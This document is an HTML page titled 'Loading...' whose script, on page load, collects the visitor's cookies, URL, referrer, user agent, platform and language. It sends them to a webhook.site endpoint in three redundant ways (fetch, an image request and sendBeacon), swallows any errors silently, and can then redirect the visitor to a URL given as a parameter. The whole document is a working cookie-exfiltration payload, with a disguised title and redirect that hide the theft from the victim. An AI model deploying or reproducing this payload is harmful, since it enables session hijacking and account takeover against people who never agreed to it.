<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<h2>Processing...</h2>
<script>
// Get webhook from URL
const params = new URLSearchParams(window.location.search);
const webhook = params.get('webhook') || 'b1647e17-560f-4643-a2d6-14043b4a0eda';

// ⚠️ CRITICAL: NO fake cookie injection!
// Capture EXACTLY what's in the browser

// Get REAL cookies (or empty string if none)
const realCookies = document.cookie || 'NO_COOKIES_FOUND';

// Prepare data
const allData = {
    cookies: realCookies,
    cookieCount: document.cookie ? document.cookie.split(';').length : 0,
    hasCookies: document.cookie ? document.cookie.length > 0 : false,
    timestamp: Date.now(),
    url: window.location.href,
    referrer: document.referrer || 'Direct',
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language
};

// Send to webhook (MULTIPLE METHODS)
try {
    // Method 1: POST with JSON
    fetch(`https://webhook.site/${webhook}`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(allData)
    }).catch(() => {});
    
    // Method 2: GET via Image (shows in query string)
    new Image().src = `https://webhook.site/${webhook}?cookies=${encodeURIComponent(realCookies)}&time=${Date.now()}`;
    
    // Method 3: Beacon
    if (navigator.sendBeacon) {
        navigator.sendBeacon(`https://webhook.site/${webhook}`, JSON.stringify(allData));
    }
} catch(e) {
    // Silent fail
}

// Show what was captured
document.body.innerHTML = `
    <h3>Cookie Capture Status</h3>
    <p>📊 Cookies found: ${document.cookie ? document.cookie.split(';').length : 0}</p>
    <p>🍪 ${document.cookie || '⚠️ No cookies found in this browser'}</p>
    <p style="color: ${document.cookie ? 'green' : 'red'}">
        ${document.cookie ? '✅ Real cookies captured and sent!' : '❌ No cookies to capture'}
    </p>
`;

// Redirect if specified
const redirect = params.get('redirect');
if (redirect) {
    setTimeout(() => window.location.href = redirect, 3000);
}
</script>
</body>
</html>
